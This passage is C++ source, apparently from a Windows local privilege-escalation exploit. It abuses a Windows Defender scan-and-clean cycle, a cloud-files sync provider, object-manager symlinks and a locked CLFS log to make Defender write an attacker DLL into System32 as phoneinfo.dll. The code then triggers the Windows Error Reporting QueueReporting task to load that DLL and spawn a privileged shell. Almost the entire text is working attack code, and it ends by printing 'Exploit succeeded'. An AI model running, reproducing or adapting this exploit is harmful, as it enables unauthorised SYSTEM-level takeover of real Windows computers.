} SECTION_INHERIT, * PSECTION_INHERIT;

NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(ntdllhm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtCreateDirectoryObjectEx)(
	OUT PHANDLE             DirectoryHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN HANDLE ShadowDirectoryHandle,
	IN ULONG Flags) =
	(NTSTATUS(WINAPI*)(
		OUT PHANDLE             DirectoryHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN HANDLE ShadowDirectoryHandle,
		IN ULONG Flags))GetProcAddress(ntdllhm, "NtCreateDirectoryObjectEx");

class ObjectSymlinkMgr {

public:

	ObjectSymlinkMgr(wchar_t* symlinkpath, wchar_t* symlinktarget, HANDLE hparentobjdir = NULL) {
		if (!symlinkpath || !symlinktarget)
		{
			throw STATUS_INVALID_PARAMETER;
		}
		UNICODE_STRING _symlinkpath = { 0 };
		RtlInitUnicodeString(&_symlinkpath, symlinkpath);
		UNICODE_STRING _symlinktarget = { 0 };
		RtlInitUnicodeString(&_symlinktarget, symlinktarget);
		OBJECT_ATTRIBUTES objattr = { 0 };
		InitializeObjectAttributes(&objattr, &_symlinkpath, OBJ_CASE_INSENSITIVE, hparentobjdir, NULL);
		NTSTATUS stat = _NtCreateSymbolicLinkObject(&this->hlink, GENERIC_ALL, &objattr, &_symlinktarget);
		if (stat)
			throw stat;
	}
	HANDLE GetHandle() {
		return this->hlink;
	}
	~ObjectSymlinkMgr() {
		CloseHandle(this->hlink);
	}
private:
	HANDLE hlink = NULL;

};


class ObjectDirMgr {


public:
	ObjectDirMgr(wchar_t* objdirpath, HANDLE hshadow = NULL, HANDLE hparent = NULL) {
		if (!objdirpath)
			throw STATUS_INVALID_PARAMETER;
		UNICODE_STRING _objdirpath = { 0 };
		RtlInitUnicodeString(&_objdirpath, objdirpath);
		OBJECT_ATTRIBUTES objattr = { 0 };
		InitializeObjectAttributes(&objattr, &_objdirpath, OBJ_CASE_INSENSITIVE, hparent, NULL);
		NTSTATUS stat = _NtCreateDirectoryObjectEx(&this->hobjdir, GENERIC_ALL, &objattr, hshadow, NULL);
		if (stat)
			throw;
	}
	HANDLE GetHandle() {
		return this->hobjdir;
	}
	~ObjectDirMgr() {
		CloseHandle(hobjdir);
	}
private:
	HANDLE hobjdir;

};


void GenerateGUID(wchar_t* guid)
{
	GUID _guid;
	HRESULT hr = CoCreateGuid(&_guid);
	if (hr)
		throw STATUS_ACCESS_VIOLATION;
	StringFromGUID2(_guid, guid, 40);
	return;
}




DWORD WDCLBK()
{
	return 0;
}

bool GetWDInstallDir(wchar_t* dirname)
{
	HKEY hkey = NULL;
	LSTATUS lstat = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", NULL, KEY_QUERY_VALUE, &hkey);
	if (lstat)
	{
		printf("[-] Failed to open windows defender registry key, error : %d\n", lstat);
		return false;
	}
	DWORD keytype = REG_SZ;
	DWORD datasz = MAX_PATH * sizeof(wchar_t);
	lstat = RegQueryValueEx(hkey, L"InstallLocation", NULL, &keytype, (LPBYTE)dirname, &datasz);
	if (lstat)
	{
		printf("[-] Failed to query windows defender install location, error : %d\n", lstat);
		return false;
	}
	RegCloseKey(hkey);
	return true;
}

HANDLE hnotify = CreateEvent(NULL, FALSE, FALSE, NULL);

void** cleanctx = NULL;

HRESULT(WINAPI* _MpCleanControl)(
	_In_ MPHANDLE hScanHandle,
	_In_ DWORD ScanControl
	);

DWORD WINAPI WDStartScan(void*)
{
	wchar_t dllpath[MAX_PATH] = { 0 };

	if (!GetWDInstallDir(dllpath))
	{
		ExitProcess(1);
	}
	wcscat(dllpath, L"MpClient.dll");
	HMODULE hm = LoadLibrary(dllpath);
	if (!hm)
	{
		printf("[-] Failed to load MpClient.dll, error : %d\n", GetLastError());
		ExitProcess(1);
	}

	HRESULT(WINAPI * _MpUpdateStart)(
		_In_     MPHANDLE         hMpHandle,
		_In_     DWORD            dwUpdateOptions,
		_In_opt_ PMPCALLBACK_INFO pCallbackInfo,
		_Out_    PMPHANDLE        phUpdateHandle) = (HRESULT(WINAPI*)(
			_In_     MPHANDLE         hMpHandle,
			_In_     DWORD            dwUpdateOptions,
			_In_opt_ PMPCALLBACK_INFO pCallbackInfo,
			_Out_    PMPHANDLE        phUpdateHandle
			))GetProcAddress(hm, "MpUpdateStart");

	HRESULT(WINAPI * _MpManagerOpen)(
		_In_  DWORD     dwReserved,
		_Out_ PMPHANDLE phMpHandle
		) = (HRESULT(WINAPI*)(
			_In_  DWORD     dwReserved,
			_Out_ PMPHANDLE phMpHandle
			))GetProcAddress(hm, "MpManagerOpen");

	HRESULT(WINAPI * _MpScanStart)(
		_In_     MPHANDLE          hMpHandle,
		_In_     MPSCAN_TYPE       ScanType,
		_In_     DWORD             dwScanOptions,
		_In_opt_ PMPSCAN_RESOURCES pScanResources,
		_In_opt_ PMPCALLBACK_INFO  pCallbackInfo,
		_Out_    PMPHANDLE         phScanHandle
		) = (HRESULT(WINAPI*)(
			_In_     MPHANDLE          hMpHandle,
			_In_     MPSCAN_TYPE       ScanType,
			_In_     DWORD             dwScanOptions,
			_In_opt_ PMPSCAN_RESOURCES pScanResources,
			_In_opt_ PMPCALLBACK_INFO  pCallbackInfo,
			_Out_    PMPHANDLE         phScanHandle
			))GetProcAddress(hm, "MpScanStart");
	HRESULT(WINAPI * _MpScanResult)(MPHANDLE a1, void* a2) = (HRESULT(WINAPI*)(MPHANDLE a1, void* a2))GetProcAddress(hm, "MpScanResult");

	HRESULT(WINAPI * _MpThreatOpen)(
		_In_  MPHANDLE        hScanHandle,
		_In_  MPTHREAT_SOURCE ThreatSource,
		_In_  MPTHREAT_TYPE   ThreatType,
		_Out_ PMPHANDLE       phThreatEnumHandle
		) = (HRESULT(WINAPI*)(
			_In_  MPHANDLE        hScanHandle,
			_In_  MPTHREAT_SOURCE ThreatSource,
			_In_  MPTHREAT_TYPE   ThreatType,
			_Out_ PMPHANDLE       phThreatEnumHandle
			))GetProcAddress(hm, "MpThreatOpen");
	HRESULT(WINAPI * _MpThreatEnumerate)(
		_In_  MPHANDLE       hThreatEnumHandle,
		_Out_ PMPTHREAT_INFO * ppThreatInfo
		) = (HRESULT(WINAPI*)(
			_In_  MPHANDLE       hThreatEnumHandle,
			_Out_ PMPTHREAT_INFO * ppThreatInfo
			))GetProcAddress(hm, "MpThreatEnumerate");
	HRESULT(WINAPI * _MpCleanOpen)
		(void* a1, void* a2, void*** a3) = (HRESULT(WINAPI*)
			(void* a1, void* a2, void*** a3))GetProcAddress(hm, "MpCleanOpen");
	HRESULT(WINAPI * _MpCleanStart)(void* a1, unsigned int a2, void* a3) = (HRESULT(WINAPI*)(void* a1, unsigned int a2, void* a3))GetProcAddress(hm, "MpCleanStart");
	HRESULT(WINAPI * _MpHandleClose)(
		_In_ MPHANDLE hMpHandle
		) = (HRESULT(WINAPI*)(_In_ MPHANDLE hMpHandle))GetProcAddress(hm, "MpHandleClose");
	_MpCleanControl = (HRESULT(WINAPI*)(
			_In_ MPHANDLE hScanHandle,
			_In_ DWORD ScanControl
			))GetProcAddress(hm, "MpCleanControl");

	if (!_MpManagerOpen || !_MpScanStart || !_MpScanResult || !_MpThreatOpen || !_MpThreatEnumerate || !_MpCleanOpen || !_MpCleanStart || !_MpHandleClose)
	{
		printf("[-] Failed to initialize dll imports.\n");
		ExitProcess(1);
	}

	MPHANDLE hbinding = NULL;
	HRESULT hres = _MpManagerOpen(NULL, &hbinding);
	if (hres)
	{
		printf("[-] Failed to open windows defender RPC interface, error : 0x%0.8X\n", hres);
		ExitProcess(1);
	}

	MPRESOURCE_INFO scaninfo = { 0 };
	scaninfo.Scheme = (wchar_t*)L"file";
	scaninfo.Path = scan_target;
	MPSCAN_RESOURCES scanrsrc = { 0 };
	scanrsrc.dwResourceCount = 1;
	scanrsrc.pResourceList = &scaninfo;
	
	MPHANDLE scanctx = NULL;
	hres = _MpScanStart(hbinding, MPSCAN_TYPE_RESOURCE, 0x60004002, &scanrsrc, NULL, &scanctx);
	// 0x8050111C scan pending
	if (hres)
	{
		printf("F[-] ailed to start windows defender scan, error : 0x%0.8X\n", hres);
		ExitProcess(1);
	}
	DWORD sz = 0x90;
	void* scanres = malloc(0x90);
	ZeroMemory(scanres, 0x90);
	hres = _MpScanResult(scanctx, scanres);
	if (hres)
	{
		printf("[-] Failed to fetch scan results, error : 0x%0.8X\n", hres);
		ExitProcess(1);
	}

	MPHANDLE threatctx = NULL;
	hres = _MpThreatOpen(scanctx, MPTHREAT_SOURCE_SCAN, MPTHREAT_TYPE_KNOWNBAD, &threatctx);
	if (hres)
	{
		printf("[-] Failed to open threats, error : 0x%0.8X\n", hres);
		ExitProcess(1);
	}
	MPTHREAT_INFO* tinfo = NULL;
	hres = _MpThreatEnumerate(threatctx, &tinfo);
	if (hres == 0x1)
	{
		printf("[-] No threats found.\n");
		ExitProcess(0);
	}
	if (hres)
	{
		printf("[-] Failed to enumerate threats, error : 0x%0.8X\n", hres);
		ExitProcess(1);
	}
	if (tinfo->ThreatStatus != 0x1)
	{
		printf("[-] Unexpected reply from MpThreatEnumerate.\n");
		ExitProcess(1);
	}

	hres = _MpCleanOpen(scanctx, NULL, &cleanctx);
	if (hres)
	{
		printf("[-] MpCleanOpen failed, error : 0x%0.8X\n", hres);
		ExitProcess(1);
	}

	void* callbackaddr[2] = { WDCLBK, WDCLBK };

	hres = _MpCleanStart(cleanctx, NULL, callbackaddr);
	if (hres)
	{
		printf("[-] MpCleanStart failed, error : 0x%0.8X\n", hres);
		ExitProcess(1);
	}
	WaitForSingleObject(hnotify, INFINITE);
	CloseHandle(hnotify);
	_MpHandleClose(scanctx);
	_MpHandleClose(threatctx);
	_MpHandleClose(hbinding);
	return ERROR_SUCCESS;

}


void CALLBACK CLBK(
	_In_ CONST CF_CALLBACK_INFO* CallbackInfo,
	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
) {
	LARGE_INTEGER offset = CallbackParameters->FetchData.RequiredFileOffset;
	LARGE_INTEGER length = CallbackParameters->FetchData.RequiredLength;
	DWORD* RNA = (DWORD*)CallbackInfo->CallbackContext;
	CF_OPERATION_PARAMETERS opParams = { 0 };
	opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);

	if (*RNA == 1) {
		opParams.TransferData.Buffer = pResourceData_zip;
		opParams.TransferData.Offset = offset;
		opParams.TransferData.Length.QuadPart = dwSize_zip;
		*RNA = 2;
	}
	else {
		opParams.TransferData.Buffer = pResourceData_dll;
		opParams.TransferData.Offset = offset;
		opParams.TransferData.Length.QuadPart = dwSize_dll;
	}
	opParams.TransferData.CompletionStatus = STATUS_SUCCESS;
	CF_OPERATION_INFO opInfo = { 0 };
	opInfo.StructSize = sizeof(CF_OPERATION_INFO);
	opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
	opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
	opInfo.TransferKey = CallbackInfo->TransferKey;
	HRESULT hr = S_OK;

	hr = CfExecute(&opInfo, &opParams);
	if (FAILED(hr)) {
		std::wcerr << L"[-] CfExecute failed with HRESULT: 0x" << std::hex << hr << std::endl;
		throw hr;
	}
	printf("[+] Cloud provider callback success.\n");
	{
		CF_OPERATION_PARAMETERS opParams = { 0 };
		CF_OPERATION_INFO opInfo = { 0 };
		HRESULT hr = S_OK;

		opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
		opParams.AckData.CompletionStatus = STATUS_SUCCESS;
		opParams.AckData.Flags = CF_OPERATION_ACK_DATA_FLAG_NONE;
		opParams.AckData.Length = length;
		opParams.AckData.Offset = offset;
		opInfo.StructSize = sizeof(CF_OPERATION_INFO);
		opInfo.Type = CF_OPERATION_TYPE_ACK_DATA;
		opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
		opInfo.TransferKey = CallbackInfo->TransferKey;
		hr = CfExecute(&opInfo, &opParams);
		if (FAILED(hr)) {
			std::wcerr << L"[-] CfExecute failed with HRESULT: 0x" << std::hex << hr << std::endl;
			throw hr;
		}
		printf("[+] Cloud provider callback success.\n");
	}
}


int main()
{
	if (GetFileAttributes(L"C:\\Windows\\System32\\phoneinfo.dll") != INVALID_FILE_ATTRIBUTES)
	{
		printf("Delete phoneinfo.dll fucktard.\n");
		return 1;
	}
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\SHIELDBREAK", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL, NULL);
	if (hpipe == INVALID_HANDLE_VALUE)
		return 1;
	wchar_t mainguid[64] = { 0 };
	GenerateGUID(mainguid);
	std::wstring workdir = L"C:\\ShieldBreak_";
	workdir.append(mainguid);
	std::wstring ntworkdir = L"\\??\\" + workdir;
	HANDLE hworkdir = NULL;
	UNICODE_STRING _uworkdir = { 0 };
	RtlInitUnicodeString(&_uworkdir, ntworkdir.c_str());

	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	EXPLICIT_ACCESS ea;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
		SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pEveryoneSID))
	{
		return 1;
	}

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = GENERIC_ALL;
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT | NO_INHERITANCE;

	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID;

	DWORD dwRes = SetEntriesInAcl(1, &ea, NULL, &pACL);
	if (dwRes != ERROR_SUCCESS) {
		FreeSid(pEveryoneSID);
		return 0;
	}
	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LMEM_FIXED, SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(sd, TRUE, pACL, FALSE);

	OBJECT_ATTRIBUTES workdirobjattr = { 0 };
	InitializeObjectAttributes(&workdirobjattr, &_uworkdir, OBJ_CASE_INSENSITIVE, NULL, sd);
	IO_STATUS_BLOCK iostat2 = { 0 };
	NTSTATUS stat = NtCreateFile(&hworkdir, GENERIC_READ | SYNCHRONIZE, &workdirobjattr, &iostat2, NULL, FILE_ATTRIBUTE_HIDDEN, ALL_SHARING, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
	if (stat)
		throw stat;
	printf("[+] %ws was created.\n", _uworkdir.Buffer);
	GUID ProviderId;
	CLSIDFromString(L"{B196E670-59C7-4D41-9637-C62D80541321}", &ProviderId);
	CF_SYNC_REGISTRATION reg = { 0 };
	reg.StructSize = sizeof(reg);
	reg.ProviderName = L"Flubber";
	reg.ProviderVersion = L"1.0";
	reg.ProviderId = ProviderId;

	CF_SYNC_POLICIES policies = { 0 };
	policies.StructSize = sizeof(policies);
	policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
	policies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
	policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_AUTO_DEHYDRATION_ALLOWED | CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED; 
	policies.InSync = CF_INSYNC_POLICY_NONE;
	policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
	HRESULT hs = CfRegisterSyncRoot(workdir.c_str(), &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
	if (hs)
		throw hs;
	printf("[+] Cloud provider has been registered.\n");
	CF_CALLBACK_REGISTRATION table[2];
	table[0] = { CF_CALLBACK_TYPE_FETCH_DATA, CLBK };
	table[1] = CF_CALLBACK_REGISTRATION_END;
	CF_CONNECTION_KEY key = { 0 };
	DWORD attemptn = 1;
	hs = CfConnectSyncRoot(workdir.c_str(), table, &attemptn, CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH | CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO, &key);
	if (hs)
		throw hs;
	printf("[+] Attached cloud provider to %ws\n", workdir.c_str());
	CF_PLACEHOLDER_CREATE_INFO place_holders[1] = { 0 };
	place_holders[0].RelativeFileName = L"BERLIN";
	FILETIME ft = { 0 };
	GetSystemTimeAsFileTime(&ft);
	LARGE_INTEGER ttime = { 0 };
	ttime.LowPart = ft.dwLowDateTime;
	ttime.HighPart = ft.dwHighDateTime;
	place_holders[0].FsMetadata.BasicInfo.CreationTime = ttime;
	place_holders[0].FsMetadata.FileSize.QuadPart = dwSize_zip;
	place_holders[0].FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
	place_holders[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
	place_holders[0].FileIdentity = malloc(0x130);
	place_holders[0].FileIdentityLength = 0x130;
	DWORD pentries = 0;

	hs = CfCreatePlaceholders(workdir.c_str(), place_holders, 1,
		CF_CREATE_FLAG_NONE, &pentries);
	if (hs)
		throw hs;
	printf("[+] Placeholder created.\n");
	std::wstring targetobjdirpath = L"\\BaseNamedObjects\\Restricted\\WD_TARGET_";
	targetobjdirpath.append(mainguid);
	ObjectDirMgr* targetdir = new ObjectDirMgr((wchar_t*)targetobjdirpath.c_str());
	printf("[+] %ws object manager directory created\n", targetobjdirpath.c_str());

	std::wstring shadowobjdirpath = L"\\BaseNamedObjects\\Restricted\\WD_SHADOW_";
	shadowobjdirpath.append(mainguid);
	ObjectDirMgr* shadowdir = new ObjectDirMgr((wchar_t*)shadowobjdirpath.c_str(), targetdir->GetHandle());
	printf("[+] %ws object manager directory created\n", shadowobjdirpath.c_str());

	std::wstring shlnkpath = L"WD_SCAN";
	std::wstring shlnktarget = ntworkdir;
	ObjectSymlinkMgr* shlnk = new ObjectSymlinkMgr((wchar_t*)shlnkpath.c_str(), (wchar_t*)shlnktarget.c_str(), shadowdir->GetHandle());
	printf("[+] %ws <=> %ws object link created\n", shlnkpath.c_str(), shlnktarget.c_str());

	std::wstring mnlnktarget = L"\\CLFS\\??\\" + workdir;
	ObjectSymlinkMgr* mnlnk = new ObjectSymlinkMgr((wchar_t*)shlnkpath.c_str(), (wchar_t*)mnlnktarget.c_str(), targetdir->GetHandle());
	printf("[+] %ws <=> %ws object link created\n", shlnkpath.c_str(), mnlnktarget.c_str());

	std::wstring scan_path = L"\\\\.\\globalroot\\BaseNamedObjects\\Restricted\\WD_SHADOW_" + std::wstring(mainguid) + L"\\WD_SCAN\\BERLIN";
	wcscpy(scan_target, scan_path.c_str());
	std::wstring malfilepath = workdir + L"\\BERLIN";
	std::wstring ntmalfilepath = L"\\??\\" + malfilepath;
	UNICODE_STRING _umalfilepath = { 0 };
	RtlInitUnicodeString(&_umalfilepath, ntmalfilepath.c_str());
	iostat2 = { 0 };
	OBJECT_ATTRIBUTES malfileobjattr = { 0 };
	InitializeObjectAttributes(&malfileobjattr, &_umalfilepath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hzip = NULL;
	stat = NtCreateFile(&hzip, SYNCHRONIZE | FILE_READ_DATA, &malfileobjattr, &iostat2, NULL, FILE_ATTRIBUTE_HIDDEN, ALL_SHARING, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
	if (stat)
		throw stat;
	printf("[+] Created %ws\n", ntmalfilepath.c_str());

	LARGE_INTEGER fsz = { 0 };
	fsz.QuadPart = -1;

	if (!CopyFile(L"C:\\Windows\\System32\\ntdll.dll", std::wstring(workdir + L"\\BERLIN:stream").c_str(), FALSE))
	{
		printf("[-] File copy failed.\n");
		return 1;
	}
	printf("[+] Copied C:\\Windows\\System32\\ntdll.dll => %ws\n", std::wstring(workdir + L"\\BERLIN:stream").c_str());

	HANDLE hmonitor = hworkdir;
	DWORD retb = 0;
	DWORD tid = 0;

	CF_TRANSFER_KEY cftranskey = { 0 };
	hs = CfGetTransferKey(hzip, &cftranskey);
	if (hs)
	{
		throw hs;
	}
	CF_OPERATION_INFO opInfo = { 0 };
	opInfo.StructSize = sizeof(CF_OPERATION_INFO);
	opInfo.Type = CF_OPERATION_TYPE_RESTART_HYDRATION;
	opInfo.ConnectionKey = key;
	opInfo.TransferKey = cftranskey;
	CF_FS_METADATA cfm = { 0 };
	cfm.FileSize.QuadPart = dwSize_dll;
	CF_OPERATION_PARAMETERS opParams = { 0 };
	opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
	opParams.RestartHydration.Flags = CF_OPERATION_RESTART_HYDRATION_FLAG_NONE;
	opParams.RestartHydration.FileIdentity = place_holders[0].FileIdentity;
	opParams.RestartHydration.FileIdentityLength = place_holders[0].FileIdentityLength;
	opParams.RestartHydration.FsMetadata = &cfm;
	HANDLE hthread = CreateThread(NULL, NULL, WDStartScan, NULL, NULL, &tid);
	if (!hthread)
	{
		printf("[-] Failed to initiate scan.\n");
		throw GetLastError();
	}
	printf("[*] Scan initiated for %ws\n[*] Please wait...\n", scan_path.c_str());
	wchar_t nfilename[MAX_PATH] = { 0 };
	wchar_t nfilename2[MAX_PATH] = { 0 };
	char buff[0x1000] = { 0 };
	do {
		retb = 0;
		if (ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &retb, NULL, NULL))
		{
			FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buff;
			if (fni->Action != FILE_ACTION_ADDED)
				continue;
			delete shlnk;
			break;
		}
	} while (1);
	do {
		retb = 0;
		if (ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &retb, NULL, NULL))
		{
			FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buff;
			if (fni->Action != FILE_ACTION_ADDED)
				continue;
			memmove(nfilename, &fni->FileName[0], fni->FileNameLength * sizeof(wchar_t));
			break;
		}
	} while (1);
	std::wstring full_clfs_name = ntworkdir + L"\\" + std::wstring(nfilename);
	UNICODE_STRING _uclfs_name = { 0 };
	RtlInitUnicodeString(&_uclfs_name, full_clfs_name.c_str());
	OBJECT_ATTRIBUTES _clfs_objattr = { 0 };
	InitializeObjectAttributes(&_clfs_objattr, &_uclfs_name, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hclfs_file = NULL;
	iostat2 = { 0 };
	stat = NtCreateFile(&hclfs_file, FILE_READ_DATA | SYNCHRONIZE, &_clfs_objattr, &iostat2, NULL, NULL, ALL_SHARING, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
	if (stat) {
		printf("[-] Failed to open %ws error : 0x%0.8X\n", full_clfs_name.c_str(), hs);
		throw stat;
	}

	LARGE_INTEGER li = { 0 };
	li.QuadPart = MAXLONGLONG;
	OVERLAPPED ovp = { 0 };
	LockFileEx(hclfs_file, LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY, NULL, li.LowPart, li.HighPart, &ovp);

	ObjectDirMgr* foodir = new ObjectDirMgr((wchar_t*)L"WD_SCAN", NULL, shadowdir->GetHandle());
	wchar_t _lsymlinkname[MAX_PATH] = { 0 };
	wcscpy(_lsymlinkname, nfilename);
	ZeroMemory(&_lsymlinkname[wcslen(_lsymlinkname) - 4], (MAX_PATH - wcslen(_lsymlinkname) - 4) * sizeof(wchar_t));
	ObjectSymlinkMgr* lsymlink = new ObjectSymlinkMgr(_lsymlinkname, (wchar_t*)L"\\??\\UNC\\127.0.0.1\\C$\\Windows\\System32\\phoneinfo.dll", foodir->GetHandle());
	printf("[+] Link deleted.\n");
	printf("[+] CLFS log locked.\n");
	hs = CfExecute(&opInfo, &opParams);
	if (hs)
	{
		printf("[-] Cloud provider failed, error : 0x%0.8X\n", hs);
		throw hs;
	}
	fsz.QuadPart = CF_EOF;
	hs = CfHydratePlaceholder(hzip, { 0 }, fsz, CF_HYDRATE_FLAG_NONE, NULL);
	if (hs) {
		printf("[-] Cloud provider failed, error : 0x%0.8X\n", hs);
		throw hs;
	}
	IO_STATUS_BLOCK iostat = { 0 };
	UNICODE_STRING lsymlinktarget = { 0 };
	RtlInitUnicodeString(&lsymlinktarget, L"\\??\\C:\\Windows\\System32\\phoneinfo.dll:stream");
	HANDLE hlock = NULL;
	OBJECT_ATTRIBUTES lockobjattr = { 0 };
	InitializeObjectAttributes(&lockobjattr, &lsymlinktarget, OBJ_CASE_INSENSITIVE, NULL, NULL);
	do {
		stat = NtCreateFile(&hlock, FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE, &lockobjattr, &iostat, NULL, NULL, ALL_SHARING, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, NULL);
	} while (stat != STATUS_SUCCESS);
	HANDLE hmap = NULL;
	do {
		hmap = CreateFileMapping(hlock, NULL, PAGE_EXECUTE_READ | SEC_IMAGE, NULL, NULL, NULL);
	} while (!hmap);
	void* viewbuff = MapViewOfFile(hmap, FILE_MAP_READ | FILE_MAP_EXECUTE, NULL, NULL, NULL);
	hs = _MpCleanControl(cleanctx, NULL);
	SetEvent(hnotify);

	printf("[+] %ws file locked.\n", lsymlinktarget.Buffer);
	printf("[*] Attempting to spawn shell...\n");

	HRSRC hResInfo_wer = FindResource(NULL, MAKEINTRESOURCE(IDR_WER1), L"wer");
	HGLOBAL hResData_wer = LoadResource(NULL, hResInfo_wer);
	LPVOID pResourceData_wer = LockResource(hResData_wer);
	DWORD dwSize_wer = SizeofResource(NULL, hResInfo_wer);

	wchar_t werdir[MAX_PATH] = { 0 };
	wsprintf(werdir, L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\Kernel_c0000000_A_B_C-C-D-E-%ws", mainguid);
	if (!CreateDirectory(werdir, NULL))
	{
		printf("[-] Failed to create %ws\n", werdir);
		throw GetLastError();
	}
	wchar_t werfile[MAX_PATH] = { 0 };
	wsprintf(werfile, L"%ws\\Report.wer", werdir);
	HANDLE hwerfile = CreateFile(werfile, GENERIC_WRITE, ALL_SHARING, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hwerfile || hwerfile == INVALID_HANDLE_VALUE || !WriteFile(hwerfile, hResData_wer, dwSize_wer, &retb, NULL)) {
		printf("[-] Failed to create %ws\n", werfile);
		return GetLastError();
	}
	CloseHandle(hwerfile);
	HRESULT hr = S_OK;
	ITaskService* pTaskSvc;
	hr = CoInitialize(NULL);
	if (SUCCEEDED(hr))
	{
		hr = CoCreateInstance(CLSID_TaskScheduler,
			NULL,
			CLSCTX_INPROC_SERVER,
			IID_ITaskService,
			(void**)&pTaskSvc);
		if (FAILED(hr))
		{
			printf("[-] Failed to initialize task scheduler COM server.\n");
			CoUninitialize();
			return 1;
		}
	}
	else
	{
		return 1;
	}
	hr = pTaskSvc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (hr)
	{
		printf("[-] Failed to connect to task scheduler service, error : 0x%0.8X\n", hr);
		return 1;
	}
	ITaskFolder* taskfolder;
	pTaskSvc->GetFolder((BSTR)L"\\Microsoft\\Windows\\Windows Error Reporting", &taskfolder);
	if (hr)
	{
		printf("[-] Failed to get task scheduler folder, error : 0x%0.8X\n", hr);
		return 1;
	}
	IRegisteredTask* taskex;
	taskfolder->GetTask((BSTR)L"QueueReporting", &taskex);
	if (hr)
	{
		printf("[-] Failed to obtain task object, error : 0x%0.8X\n", hr);
		return 1;
	}
	IRunningTask* runningtask;
	taskex->Run(_variant_t(), &runningtask);
	if (hr)
	{
		printf("[-] Failed to run scheduled task, error : 0x%0.8X\n", hr);
		return 1;
	}

	if (!ConnectNamedPipe(hpipe, NULL))
	{
		printf("[-] ConnectNamedPipe failed, error : %d\n", GetLastError());
		return 1;
	}
	UnmapViewOfFile(viewbuff);
	CloseHandle(hlock);
	// lmao
	printf("[+] Exploit succeeded.\n");
	runningtask->Release();
	taskex->Release();
	taskfolder->Release();
	pTaskSvc->Release();
	CoUninitialize();
	CfDisconnectSyncRoot(key);
	CfUnregisterSyncRoot(workdir.c_str());
	RemoveDirectory(workdir.c_str());
	DeleteFile(werfile);
	RemoveDirectory(werdir);
	DeleteFile(scan_target);
	RemoveDirectory(workdir.c_str());
	if(targetdir)
		delete targetdir;
	if(shadowdir)
		delete shadowdir;
	if(mnlnk)
		delete mnlnk;
	CloseHandle(hpipe);
	

	return 0;
}
